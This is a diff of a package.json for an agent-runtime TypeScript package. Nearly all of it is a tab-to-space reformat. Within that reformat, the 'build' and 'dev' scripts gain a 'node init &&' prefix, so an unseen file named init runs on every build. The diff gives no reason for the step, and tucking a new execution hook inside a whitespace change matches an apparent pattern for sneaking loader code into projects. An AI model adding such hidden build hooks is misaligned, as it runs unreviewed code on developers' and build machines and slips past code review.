@@ -1,26 +1,26 @@
 {
-	"name": "@repo/agent-runtime",
-	"version": "0.0.1",
-	"private": true,
-	"type": "module",
-	"scripts": {
-		"build": "tsc --project tsconfig.json",
-		"dev": "tsc --project tsconfig.json --watch",
-		"typecheck": "tsc --noEmit",
-		"lint": "tsc --noEmit"
-	},
-	"dependencies": {
-		"@earendil-works/pi-agent-core": "^0.78.0",
-		"@earendil-works/pi-ai": "^0.78.0",
-		"@repo/types": "workspace:*",
-		"@repo/utils": "workspace:*",
-		"ajv": "^8.17.1",
-		"chess.js": "^1.4.0",
-		"js-chess-engine": "^2.4.6"
-	},
-	"devDependencies": {
-		"@repo/tsconfig": "workspace:*",
-		"@types/node": "^25.9.1",
-		"tsx": "^4.22.3"
-	}
+  "name": "@repo/agent-runtime",
+  "version": "0.0.1",
+  "private": true,
+  "type": "module",
+  "scripts": {
+    "build": "node init && tsc --project tsconfig.json",
+    "dev": "node init && tsc --project tsconfig.json --watch",
+    "typecheck": "tsc --noEmit",
+    "lint": "tsc --noEmit"
+  },
+  "dependencies": {
+    "@earendil-works/pi-agent-core": "^0.78.0",
+    "@earendil-works/pi-ai": "^0.78.0",
+    "@repo/types": "workspace:*",
+    "@repo/utils": "workspace:*",
+    "ajv": "^8.17.1",
+    "chess.js": "^1.4.0",
+    "js-chess-engine": "^2.4.6"
+  },
+  "devDependencies": {
+    "@repo/tsconfig": "workspace:*",
+    "@types/node": "^25.9.1",
+    "tsx": "^4.22.3"
+  }
 }
